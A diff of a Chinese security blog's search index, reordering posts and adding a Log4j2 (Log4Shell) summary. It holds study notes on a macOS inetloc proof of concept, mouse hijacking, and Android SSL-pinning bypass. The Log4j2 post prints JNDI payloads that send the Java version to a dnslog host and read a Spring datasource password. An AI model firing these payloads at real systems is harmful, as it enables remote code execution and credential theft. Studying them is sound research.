@@ -1,42 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>arm64汇编(1)</title>
-    <url>/2021/12/06/arm64-hello,world/</url>
-    <content><![CDATA[<h1 id="简单代码学习"><a href="#简单代码学习" class="headerlink" title="简单代码学习"></a>简单代码学习</h1><p>mac 使用android的工具进行 编译</p>
-<p>目录<br>/Users/xxx/Library/Android/sdk/ndk/21.4.7075529/toolchains/arm-linux-androideabi-4.9/prebuilt/darwin-x86_64/bin</p>
-<p>编辑hello.S</p>
-<p>代码<br><br><br>.text </p>
-<p>.globl _start</p>
-<p>_start:<br>        mov %r0, $1<br>        ldr %r1, =message<br>        mov %r2, $message_len<br>        mov %r7, $4<br>        swi $0<br>        mov %r0, $0<br>        mov %r7, $1<br>        swi $0<br>.data</p>
-<p>message:<br>        .ascii “hello,world!\n”<br>message_len = . -message<br><br></p>
-<h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>./arm-linux-androideabi-as -o hello.o hello.S<br>./arm-linux-androideabi-as -o hello hello.o</p>
-<p>将hello 拷贝到手机即可执行<br><img src="/images/arm/1.png" alt="hello,world"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>MacOS 2021-9-21 inetloc复现</title>
-    <url>/2021/09/22/macos%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="big-sur-lt-11-2-3-20D91）"><a href="#big-sur-lt-11-2-3-20D91）" class="headerlink" title="big sur&lt;=11.2.3 (20D91）"></a>big sur&lt;=11.2.3 (20D91）</h1><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>保存为hello.inetloc
-</code></pre>
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-  <dict>
-    <key>URL</key>
-    <string>FiLe:////////////////////////System/Applications/Calculator.app</string>
-  </dict>
-</plist>
-
-<span id="more"></span>    
-<p>双击执行</p>
-<p><img src="/images/cal.jpg" alt="计算器"></p>
-]]></content>
-      <categories>
-        <category>MacOS</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Crazyradio PA---罗技 鼠标劫持</title>
     <url>/2021/09/24/Crazyradio%20PA---%E7%BD%97%E6%8A%80%20%E9%BC%A0%E6%A0%87%E5%8A%AB%E6%8C%81/</url>
     <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>  <a href="https://www.bettercap.org/modules/hid/">https://www.bettercap.org/modules/hid/</a><br>  <a href="https://github.com/BastilleResearch/nrf-research-firmware">https://github.com/BastilleResearch/nrf-research-firmware</a><br>  <a href="https://github.com/hak5darren">https://github.com/hak5darren</a></p>
@@ -90,6 +54,62 @@ bettercap也可以不使用，但使用hid模块，通过数据传输总量有�
       </categories>
   </entry>
   <entry>
+    <title>Log4j2 相关总结(待修改，补充)</title>
+    <url>/2022/01/01/Log4j2%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>对java安全也不是很熟，平时也只是看一下攻击的姿势。<br>但这次毕竟安全圈大事，凑个热闹 简单学习下原理。<br>国外将其命名为 Log4Shell</p>
+<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="结构："><a href="#结构：" class="headerlink" title="结构："></a>结构：</h2><p>从上往下看 每一层 </p>
+<p>Java App<br>Jndi Api<br>Naming Manger<br>Jndi api<br>Ladp Dns  Rmi Corba</p>
+<h2 id="发展历程-2013年就存在的漏洞"><a href="#发展历程-2013年就存在的漏洞" class="headerlink" title="发展历程 2013年就存在的漏洞"></a>发展历程 2013年就存在的漏洞</h2><p>1.2013年，有人向Log4j2开源社区提交支持JNDI Lookup 插件的请求并被采纳</p>
+<p>2.2016年 首次黑客大会介绍Jndi<br><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></p>
+<p>3.2021年爆发</p>
+<p>ps：个人觉得，其实这个洞应该早就被利用了，只是在某种利益的情况，被爆了出来。<br>    好多-1day 都掌握在某些人或团队手里</p>
+<h1 id="问题核心"><a href="#问题核心" class="headerlink" title="问题核心"></a>问题核心</h1><h2 id="Lookup"><a href="#Lookup" class="headerlink" title="Lookup"></a>Lookup</h2><h2 id="Jndi-的动态协议切换（正常功能）"><a href="#Jndi-的动态协议切换（正常功能）" class="headerlink" title="Jndi 的动态协议切换（正常功能）"></a>Jndi 的动态协议切换（正常功能）</h2><p> Log4j-core 自带的lookup有很多实例<br> log4j2是Java 日志开发框架 1.x 重写的。</p>
+<h2 id="简单原理"><a href="#简单原理" class="headerlink" title="简单原理"></a>简单原理</h2><p> 日志打印 遇到 ${ 分割执行<br> logger.error(“error_message:${jndi:ldap://xxx/class}”);<br> 变成<br> jndi:ldap://xxx/xxx  进入存在漏洞的 JndiLookup 实例,用 InitialContext.lookup去访问<br> 导致jndi代码执行</p>
+<h2 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h2><p>   “ElasticSearch利用Java的SecurityManager安全机制来防御文件操作和Socket操作，所以无法正常连接远程服务器”<br>   p牛的研究。所以其实有些有RASP，SecurityManager是无法rce的。</p>
+<p>   本地信息泄漏，报错回显：<br>   System.getProperty() ，System.getenv()，ResourceBundleLookup</p>
+<p>   展开来说：<br>   1.嵌套标签<br>    ${jndi:ldap://${java:version}.u2xf5m.dnslog.cn}<br>   2.sys env<br>    参考：<a href="https://github.com/jas502n/Log4j2-CVE-2021-44228">https://github.com/jas502n/Log4j2-CVE-2021-44228</a><br>   3.Bundle<br>    参考：<a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a><br>    ${bundle:application:spring.datasource.password}<br>    条件：springboot加入log4j2依赖</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>arm64汇编(1)</title>
+    <url>/2021/12/06/arm64-hello,world/</url>
+    <content><![CDATA[<h1 id="简单代码学习"><a href="#简单代码学习" class="headerlink" title="简单代码学习"></a>简单代码学习</h1><p>mac 使用android的工具进行 编译</p>
+<p>目录<br>/Users/xxx/Library/Android/sdk/ndk/21.4.7075529/toolchains/arm-linux-androideabi-4.9/prebuilt/darwin-x86_64/bin</p>
+<p>编辑hello.S</p>
+<p>代码<br><br><br>.text </p>
+<p>.globl _start</p>
+<p>_start:<br>        mov %r0, $1<br>        ldr %r1, =message<br>        mov %r2, $message_len<br>        mov %r7, $4<br>        swi $0<br>        mov %r0, $0<br>        mov %r7, $1<br>        swi $0<br>.data</p>
+<p>message:<br>        .ascii “hello,world!\n”<br>message_len = . -message<br><br></p>
+<h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>./arm-linux-androideabi-as -o hello.o hello.S<br>./arm-linux-androideabi-as -o hello hello.o</p>
+<p>将hello 拷贝到手机即可执行<br><img src="/images/arm/1.png" alt="hello,world"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>MacOS 2021-9-21 inetloc复现</title>
+    <url>/2021/09/22/macos%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="big-sur-lt-11-2-3-20D91）"><a href="#big-sur-lt-11-2-3-20D91）" class="headerlink" title="big sur&lt;=11.2.3 (20D91）"></a>big sur&lt;=11.2.3 (20D91）</h1><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>保存为hello.inetloc
+</code></pre>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+  <dict>
+    <key>URL</key>
+    <string>FiLe:////////////////////////System/Applications/Calculator.app</string>
+  </dict>
+</plist>
+
+<span id="more"></span>    
+<p>双击执行</p>
+<p><img src="/images/cal.jpg" alt="计算器"></p>
+]]></content>
+      <categories>
+        <category>MacOS</category>
+      </categories>
+  </entry>
+  <entry>
     <title>小程序安全测试--微信（1）</title>
     <url>/2021/09/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[<h1 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h1><pre><code>注：因为小程序鹅厂有自己的一套加密服务，如果小程序购买了这个服务，反编译不一定能成功
@@ -108,20 +128,6 @@ bettercap也可以不使用，但使用hid模块，通过数据传输总量有�
 ]]></content>
       <categories>
         <category>小程序</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>某蜂app抓包分析</title>
-    <url>/2021/10/10/%E6%9F%90%E8%9C%82app%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>尝试解除flutter<br>hook java sll<br>内存dump双向认证证书<br>导入burp抓包测试</p>
-<p>1.flutter<br>参考：<a href="https://bbs.pediy.com/thread-261941.htm">https://bbs.pediy.com/thread-261941.htm</a></p>
-<p>apk解压后发现flutter的so文件<br>以为是flutter问题<br>找到字节进行hook（ida–&gt;ssl_client–&gt;x–&gt;取字节 ）<br>x 之后 add R2，pc；”ssl_clinet”</p>
-<p>2.java-ssl绕过<br>root手机配置好后进行抓包，发现不能抓<br>hook java-ssl<br>登录页面发包403显示 证书未发送</p>
-<p>3.双向认证<br>除了自己写<br>可以用工具hooker<br><a href="https://github.com/CreditTone/hooker">https://github.com/CreditTone/hooker</a><br>客户端必调java.security.KeyStore的getPrivateKey和getCertificate方法<br>hook dump证书，密码写入<br>导入 burp </p>
-<p>抓包发现逻辑漏洞。 </p>
-]]></content>
-      <categories>
-        <category>Android</category>
       </categories>
   </entry>
   <entry>
@@ -151,6 +157,20 @@ bettercap也可以不使用，但使用hid模块，通过数据传输总量有�
 ]]></content>
       <categories>
         <category>IOT</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>某蜂app抓包分析</title>
+    <url>/2021/10/10/%E6%9F%90%E8%9C%82app%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>尝试解除flutter<br>hook java sll<br>内存dump双向认证证书<br>导入burp抓包测试</p>
+<p>1.flutter<br>参考：<a href="https://bbs.pediy.com/thread-261941.htm">https://bbs.pediy.com/thread-261941.htm</a></p>
+<p>apk解压后发现flutter的so文件<br>以为是flutter问题<br>找到字节进行hook（ida–&gt;ssl_client–&gt;x–&gt;取字节 ）<br>x 之后 add R2，pc；”ssl_clinet”</p>
+<p>2.java-ssl绕过<br>root手机配置好后进行抓包，发现不能抓<br>hook java-ssl<br>登录页面发包403显示 证书未发送</p>
+<p>3.双向认证<br>除了自己写<br>可以用工具hooker<br><a href="https://github.com/CreditTone/hooker">https://github.com/CreditTone/hooker</a><br>客户端必调java.security.KeyStore的getPrivateKey和getCertificate方法<br>hook dump证书，密码写入<br>导入 burp </p>
+<p>抓包发现逻辑漏洞。 </p>
+]]></content>
+      <categories>
+        <category>Android</category>
       </categories>
   </entry>
 </search>
